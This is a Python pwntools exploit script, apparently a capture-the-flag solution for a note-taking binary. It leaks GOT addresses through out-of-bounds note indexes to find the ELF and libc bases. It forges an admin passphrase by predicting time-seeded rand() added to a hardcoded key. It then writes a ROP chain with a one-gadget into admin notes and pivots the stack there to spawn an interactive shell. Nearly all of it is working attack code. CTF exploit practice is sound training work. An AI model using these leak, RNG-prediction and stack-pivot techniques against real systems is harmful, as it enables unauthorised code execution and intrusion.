#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

exe = context.binary = ELF('app_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x0176C
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def addNote(note):
    io.sendlineafter(b">", b"1")
    io.sendafter(b":", note)

def viewNote(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recvline().strip(b"\n")
    return data

def disableEnc():
    io.sendlineafter(b">", b"3")

def adminLogin(passphrase):
    io.sendlineafter(b">", b"1337")
    io.sendlineafter(b":", str(passphrase).encode())

def adminAddNote(data):
    io.sendlineafter(b"implemented)", b"3")
    io.sendafter(b":", data)

def executeCommand(payload):
    io.sendlineafter(b"implemented)", b"5")
    io.sendafter(b":", payload)

def solve():

    offset = (exe.got["puts"] - exe.sym["notes"]) // 9
    disableEnc()
    puts = u64(viewNote(offset).ljust(8, b"\x00"))
    exe.address = puts - 0x1046
    info("elf base: %#x", exe.address)

    offset = (exe.got["setvbuf"] - exe.sym["notes"]) // 9
    setvbuf = u64(viewNote(offset).ljust(8, b"\x00"))
    libc.address = setvbuf - libc.sym["setvbuf"]
    info("libc base: %#x", libc.address)

    lib = CDLL(None)
    lib.srand(int(time.time()))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rbp = rop.find_gadget(["pop rbp", "ret"])[0]
    pop_rsp = rop.find_gadget(["pop rsp", "ret"])[0]
    ret = pop_rdi + 1
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    
    # payload = flat(
    #     [
    #         b"A"*8,
    #         b"B"*8,
    #         b"C"*8,
    #         b"D"*8
    #     ]
    # )

    # for i in range(0, len(payload), 8):
    #     addNote(payload[i:i+8])

    payload = flat(
        [
            pop_rbp,
            exe.address + 0x4118 + 0x78,
            libc.address + 0xef52b,
        ]
    )

    rand = lib.rand()
    secret_key = 0x4465544341443352
    passphrase = secret_key + rand
    adminLogin(passphrase)

    for i in range(0, len(payload), 8):
        adminAddNote(payload[i:i+8])

    offset = 64
    payload = flat({
        offset: [
            exe.sym["admin_notes"] - 8
        ]
    })
    pause(3)
    executeCommand(payload)
    io.sendline(b"4")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
